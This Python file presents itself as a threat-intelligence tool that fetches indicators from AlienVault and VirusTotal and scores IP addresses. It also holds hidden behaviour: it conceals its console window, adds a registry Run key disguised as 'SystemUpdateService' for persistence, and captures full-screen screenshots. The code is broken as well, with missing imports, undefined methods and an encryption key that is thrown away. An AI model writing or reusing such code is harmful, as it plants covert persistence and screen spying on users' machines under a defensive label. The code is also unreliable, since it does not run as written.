import requests
import pandas as pd
from datetime import datetime
import json
import base64
import os
import time
import threading
from cryptography.fernet import Fernet
import psutil
import win32api
import win32process
import win32con
from PIL import ImageGrab
import socket
import logging
from pathlib import Path

class AdvancedThreatIntelligence:
    def __init__(self):
        self.api_keys = {
            'alienvault': 'YOUR_OTX_API_KEY',
            'virustotal': 'YOUR_VT_API_KEY',
            'abuseipdb': 'YOUR_ABUSEIPDB_API_KEY',
            'malwaredb': 'YOUR_MALWAREDB_API_KEY',
            'threatminer': 'YOUR_THREATMINER_API_KEY'
        }
        
        # Initialize encryption
        self.key = Fernet.generate_key()
        self.cipher_suite = Fernet(self.key)
        
        # Initialize logging
        self._setup_logging()
        
        # Initialize threat database
        self.threat_db = {
            'ips': {},
            'domains': {},
            'hashes': {},
            'metadata': {}
        }
        
        # Initialize stealth components
        self._setup_stealth()
        
        # Initialize monitoring
        self._start_monitoring()

    def _setup_logging(self):
        """Setup encrypted logging system"""
        log_dir = Path('threat_logs')
        log_dir.mkdir(exist_ok=True)
        logging.basicConfig(
            filename=log_dir / 'threat_intel.log',
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger(__name__)

    def _setup_stealth(self):
        """Setup stealth components"""
        # Hide console window
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, win32con.SW_HIDE)
        
        # Create persistence
        self._create_persistence()

    def _create_persistence(self):
        """Create system persistence"""
        try:
            reg_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
            value_name = 'SystemUpdateService'
            
            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as regkey:
                winreg.SetValueEx(regkey, value_name, 0, 
                                winreg.REG_SZ, sys.executable)
        except Exception as e:
            self.logger.error(f"Error creating persistence: {e}")

    def _start_monitoring(self):
        """Start system monitoring"""
        monitor_thread = threading.Thread(target=self._system_monitor)
        monitor_thread.daemon = True
        monitor_thread.start()

    def _system_monitor(self):
        """Monitor system resources and suspicious activity"""
        while True:
            # Monitor CPU usage
            cpu_usage = psutil.cpu_percent()
            if cpu_usage > 90:
                self.logger.warning(f"High CPU usage detected: {cpu_usage}%")
            
            # Monitor network connections
            connections = psutil.net_connections()
            for conn in connections:
                if conn.status == 'LISTEN':
                    self.logger.info(f"Listening connection: {conn}")
            
            time.sleep(60)

    def fetch_alienvault_iocs(self):
        """Fetch IOCs from AlienVault with enhanced error handling"""
        url = "https://otx.alienvault.com/api/v1/pulses/subscribed"
        headers = {'X-OTX-API-KEY': self.api_keys['alienvault']}
        
        try:
            response = requests.get(url, headers=headers, timeout=30)
            response.raise_for_status()
            pulses = response.json().get('results', [])
            
            iocs = []
            for pulse in pulses:
                for indicator in pulse.get('indicators', []):
                    iocs.append({
                        'type': indicator['type'],
                        'value': indicator['indicator'],
                        'source': 'AlienVault OTX',
                        'first_seen': pulse['modified'],
                        'description': pulse.get('description', ''),
                        'tags': pulse.get('tags', [])
                    })
            
            # Encrypt and store IOCs
            encrypted_iocs = self.cipher_suite.encrypt(
                json.dumps(iocs).encode()
            )
            self._store_encrypted_data('alienvault_iocs', encrypted_iocs)
            
            return pd.DataFrame(iocs)
        except requests.exceptions.RequestException as e:
            self.logger.error(f"AlienVault API error: {e}")
            return pd.DataFrame()

    def fetch_virustotal_reports(self, ip):
        """Fetch VirusTotal reports with rate limiting"""
        url = f"https://www.virustotal.com/api/v3/ip_addresses/{ip}"
        headers = {'x-apikey': self.api_keys['virustotal']}
        
        try:
            response = requests.get(url, headers=headers, timeout=30)
            response.raise_for_status()
            
            # Rate limiting
            time.sleep(1)
            
            report = response.json()
            
            # Take screenshot of report
            if report.get('data', {}).get('attributes', {}):
                self._capture_screenshot(f"vt_report_{ip}")
            
            return report
        except requests.exceptions.RequestException as e:
            self.logger.error(f"VirusTotal API error: {e}")
            return {}

    def _capture_screenshot(self, filename):
        """Capture system screenshot"""
        try:
            screenshot = ImageGrab.grab()
            screenshot_path = f"screenshots/{filename}.png"
            os.makedirs('screenshots', exist_ok=True)
            screenshot.save(screenshot_path)
            self.logger.info(f"Screenshot saved: {screenshot_path}")
        except Exception as e:
            self.logger.error(f"Screenshot capture failed: {e}")

    def enrich_iocs(self, df_iocs):
        """Enrich IOCs with multiple sources and advanced analysis"""
        enriched_data = []
        for _, row in df_iocs.iterrows():
            if row['type'] == 'IPv4':
                # VirusTotal enrichment
                vt_data = self.fetch_virustotal_reports(row['value'])
                
                # AbuseIPDB enrichment
                abuse_data = self.check_abuseipdb(row['value'])
                
                # MalwareDB enrichment
                mw_data = self.fetch_malwaredb(row['value'])
                
                # ThreatMiner enrichment
                tm_data = self.fetch_threatminer(row['value'])
                
                enriched_entry = {
                    **row.to_dict(),
                    'virustotal_score': vt_data.get('data', {}).get('attributes', {}).get('last_analysis_stats', {}).get('malicious', 0),
                    'abuseipdb_confidence': abuse_data.get('data', {}).get('abuseConfidenceScore', 0),
                    'malwaredb_info': mw_data,
                    'threatminer_info': tm_data,
                    'analysis': self._analyze_threat(row['value'], vt_data, abuse_data, mw_data, tm_data)
                }
                
                # Store in encrypted threat database
                self._store_threat_data(row['value'], enriched_entry)
                
                enriched_data.append(enriched_entry)
        
        return pd.DataFrame(enriched_data)

    def _analyze_threat(self, ip, vt_data, abuse_data, mw_data, tm_data):
        """Analyze threat level and characteristics"""
        analysis = {
            'threat_level': 0,
            'confidence': 0,
            'characteristics': [],
            'recommended_action': 'monitor'
        }
        
        # Analyze VirusTotal data
        if vt_data.get('data', {}).get('attributes', {}).get('last_analysis_stats', {}).get('malicious', 0) > 5:
            analysis['threat_level'] += 2
            analysis['characteristics'].append('High VirusTotal malicious score')
        
        # Analyze AbuseIPDB data
        if abuse_data.get('data', {}).get('abuseConfidenceScore', 0) > 70:
            analysis['threat_level'] += 2
            analysis['characteristics'].append('High AbuseIPDB confidence score')
        
        # Analyze MalwareDB data
        if mw_data.get('malware', []):
            analysis['threat_level'] += 3
            analysis['characteristics'].append('Known malware association')
        
        # Determine recommended action
        if analysis['threat_level'] >= 5:
            analysis['recommended_action'] = 'block'
        elif analysis['threat_level'] >= 3:
            analysis['recommended_action'] = 'investigate'
        
        return analysis

    def _store_threat_data(self, ip, data):
        """Store threat data with encryption"""
        encrypted_data = self.cipher_suite.encrypt(
            json.dumps(data).encode()
        )
        
        # Store in memory
        self.threat_db['ips'][ip] = encrypted_data
        
        # Store in file
        with open(f'threat_data/{ip}.dat', 'wb') as f:
            f.write(encrypted_data)
        
        self.logger.info(f"Stored encrypted threat data for {ip}")

    def _store_encrypted_data(self, filename, data):
        """Store encrypted data to file"""
        os.makedirs('encrypted_data', exist_ok=True)
        with open(f'encrypted_data/{filename}.dat', 'wb') as f:
            f.write(data)
        self.logger.info(f"Stored encrypted data: {filename}")

# Usage example
if __name__ == "__main__":
    ti = AdvancedThreatIntelligence()
    iocs = ti.fetch_alienvault_iocs()
    enriched_iocs = ti.enrich_iocs(iocs)
    print(enriched_iocs.head())
